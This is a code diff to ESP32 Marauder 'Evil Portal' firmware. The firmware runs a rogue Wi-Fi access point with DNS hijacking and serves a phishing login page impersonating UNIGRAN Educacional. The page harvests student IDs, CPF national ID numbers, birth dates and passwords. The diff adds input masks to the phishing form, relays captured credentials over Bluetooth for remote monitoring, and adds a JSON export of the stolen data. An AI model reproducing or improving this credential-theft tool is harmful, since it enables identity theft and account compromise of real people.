@@ -1,9 +1,15 @@
 /**
  * Evil Portal - ESP32 Marauder
  * FUNCIONANDO - HTML Personalizado UNIGRAN
+ * COM BLUETOOTH SERIAL PARA MONITORAMENTO REMOTO
  */
 
 #include "evil_portal.h"
+
+// Funcoes BT definidas em main.cpp - usar extern
+extern void btPrint(const String &msg);
+extern void btPrintln(const String &msg);
+extern void btPrintf(const char *format, ...);
 
 static DNSServer dnsServer;
 static AsyncWebServer *server = NULL;
@@ -75,6 +81,34 @@ const char PAGINA[] PROGMEM = R"rawliteral(
         <div class="foot">© UNIGRAN Educacional<br>Acesso Seguro e Monitorado</div>
     </div>
 </div>
+<script>
+function mask(e, f) {
+    var v = e.value.replace(/\D/g, '');
+    e.value = f(v);
+}
+document.querySelector('input[name="rgm"]').oninput = function() {
+    mask(this, function(v) {
+        return v.replace(/^(\d{3})(\d)/, '$1.$2').substring(0, 9);
+    });
+};
+document.querySelector('input[name="cpf"]').oninput = function() {
+    mask(this, function(v) {
+        v = v.substring(0, 11);
+        v = v.replace(/^(\d{3})(\d)/, '$1.$2');
+        v = v.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+        v = v.replace(/\.(\d{3})(\d)/, '.$1-$2');
+        return v;
+    });
+};
+document.querySelector('input[name="nasc"]').oninput = function() {
+    mask(this, function(v) {
+        v = v.substring(0, 8);
+        v = v.replace(/^(\d{2})(\d)/, '$1/$2');
+        v = v.replace(/^(\d{2})\/(\d{2})(\d)/, '$1/$2/$3');
+        return v;
+    });
+};
+</script>
 </body>
 </html>
 )rawliteral";
@@ -120,27 +154,28 @@ bool isCaptivePortalRequest(String host) {
 
 // Funcao para enviar pagina do portal
 void sendPortalPage(AsyncWebServerRequest *req) {
+  // Usar beginResponse_P para strings na memoria flash (PROGMEM)
   AsyncWebServerResponse *response =
-      req->beginResponse(200, "text/html", FPSTR(PAGINA));
+      req->beginResponse_P(200, "text/html", PAGINA);
   response->addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   response->addHeader("Pragma", "no-cache");
   response->addHeader("Expires", "-1");
   req->send(response);
 }
 
-// Handler universal
+// Handler universal - Simplificado para evitar loops
 void handleAnyRequest(AsyncWebServerRequest *req) {
   String host = req->host();
-  String url = req->url();
-  String clientIP = req->client()->remoteIP().toString();
 
-  Serial.printf("[Portal] %s %s | Host: %s | From: %s\n", req->methodToString(),
-                url.c_str(), host.c_str(), clientIP.c_str());
-
+  // Apenas logar para debug
   if (isCaptivePortalRequest(host)) {
-    Serial.println("[Portal] -> Captive Portal Detected!");
+    btPrintln("[Portal] Captive Check: " + host);
+  } else {
+    // btPrintf("[Portal] Request: %s\n", host.c_str());
   }
 
+  // ENTREGAR A PAGINA DIRETO (DNS Hijack)
+  // Nao use redirect aqui, pois causa loops no Android/iOS
   sendPortalPage(req);
 }
 
@@ -148,7 +183,7 @@ void evil_portal_init() {
   LittleFS.begin(true);
   pinMode(LED_STATUS, OUTPUT);
   digitalWrite(LED_STATUS, LOW);
-  Serial.println("[Portal] Init OK");
+  btPrintln("[Portal] Init OK");
 }
 
 bool evil_portal_start(const char *ssid) {
@@ -164,7 +199,7 @@ bool evil_portal_start(const char *ssid) {
   delay(500);
 
   portalIP = WiFi.softAPIP().toString();
-  Serial.printf("[Portal] AP IP: %s\n", portalIP.c_str());
+  btPrintf("[Portal] AP IP: %s\n", portalIP.c_str());
 
   dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(53, "*", WiFi.softAPIP());
@@ -173,18 +208,18 @@ bool evil_portal_start(const char *ssid) {
 
   // Rota de captura /login
   server->on("/login", HTTP_GET, [](AsyncWebServerRequest *req) {
-    Serial.println("\n========== CAPTURA ==========");
+    btPrintln("\n========== CAPTURA ==========");
 
     String rgm = req->hasParam("rgm") ? req->getParam("rgm")->value() : "";
     String cpf = req->hasParam("cpf") ? req->getParam("cpf")->value() : "";
     String nasc = req->hasParam("nasc") ? req->getParam("nasc")->value() : "";
     String pass = req->hasParam("pass") ? req->getParam("pass")->value() : "";
 
-    Serial.println("RGM:  " + rgm);
-    Serial.println("CPF:  " + cpf);
-    Serial.println("NASC: " + nasc);
-    Serial.println("PASS: " + pass);
-    Serial.println("==============================\n");
+    btPrintln("RGM:  " + rgm);
+    btPrintln("CPF:  " + cpf);
+    btPrintln("NASC: " + nasc);
+    btPrintln("PASS: " + pass);
+    btPrintln("==============================\n");
 
     if (credCount < MAX_CREDS && (rgm != "" || pass != "")) {
       creds[credCount].username =
@@ -194,7 +229,7 @@ bool evil_portal_start(const char *ssid) {
       creds[credCount].timestamp = String(millis() / 1000) + "s";
       credCount++;
       hasCreds = true;
-      Serial.printf("[Portal] >>> Credencial #%d SALVA! <<<\n", credCount);
+      btPrintf("[Portal] >>> Credencial #%d SALVA! <<<\n", credCount);
     }
 
     req->send(200, "text/html", FPSTR(SUCESSO));
@@ -208,8 +243,9 @@ bool evil_portal_start(const char *ssid) {
 
   server->begin();
   running = true;
-  Serial.printf("[Portal] ATIVO: %s (IP: %s)\n", ssid, portalIP.c_str());
-  Serial.println("[Portal] Aguardando conexoes...\n");
+  btPrintf("[Portal] ATIVO: %s (IP: %s)\n", ssid, portalIP.c_str());
+  btPrintln("[Portal] Aguardando conexoes...");
+  btPrintln("[BT] Conecte via Bluetooth: ESP32-Marauder\n");
   return true;
 }
 
@@ -227,7 +263,7 @@ void evil_portal_stop() {
   digitalWrite(LED_STATUS, LOW);
   hasCreds = false;
   running = false;
-  Serial.println("[Portal] Parado");
+  btPrintln("[Portal] Parado");
 }
 
 bool evil_portal_is_running() { return running; }
@@ -246,20 +282,48 @@ Credential *evil_portal_get_cred(int i) {
 void evil_portal_clear_creds() {
   credCount = 0;
   hasCreds = false;
-  Serial.println("[Portal] Limpo");
+  btPrintln("[Portal] Limpo");
 }
 void evil_portal_list_creds() {
   if (credCount == 0) {
-    Serial.println("Nenhum dado.");
+    btPrintln("Nenhum dado.");
     return;
   }
+  btPrintln("\n===== CREDENCIAIS CAPTURADAS =====");
   for (int i = 0; i < credCount; i++)
-    Serial.printf("[%d] %s | %s | IP:%s\n", i, creds[i].username.c_str(),
-                  creds[i].password.c_str(), creds[i].ip.c_str());
+    btPrintf("[%d] %s | %s | IP:%s\n", i, creds[i].username.c_str(),
+             creds[i].password.c_str(), creds[i].ip.c_str());
+  btPrintln("===================================\n");
+}
+
+static String escapeJson(const String &s) {
+  String r = s;
+  r.replace("\\", "\\\\");
+  r.replace("\"", "\\\"");
+  return r;
+}
+
+void evil_portal_export_creds(Stream &out) {
+  if (credCount == 0) {
+    out.println("[]");
+    return;
+  }
+  // Stream newline-delimited JSON objects (NDJSON) for simpler streaming
+  for (int i = 0; i < credCount; i++) {
+    String json = "{";
+    json += "\"username\":\"" + escapeJson(creds[i].username) + "\"";
+    json += ",\"password\":\"" + escapeJson(creds[i].password) + "\"";
+    json += ",\"ip\":\"" + escapeJson(creds[i].ip) + "\"";
+    json += ",\"timestamp\":\"" + escapeJson(creds[i].timestamp) + "\"";
+    json += "}";
+    out.println(json);
+    // allow BLE stack to service notifications if streaming via BLE
+    delay(1);
+  }
 }
 bool evil_portal_set_template(const char *f) { return true; }
 void evil_portal_list_templates() {}
 void evil_portal_status() {
-  Serial.printf("Status: %s | SSID: %s | Capturas: %d\n",
-                running ? "ON" : "OFF", ssidName.c_str(), credCount);
+  btPrintf("Status: %s | SSID: %s | Capturas: %d | BT: ESP32-Marauder\n",
+           running ? "ON" : "OFF", ssidName.c_str(), credCount);
 }
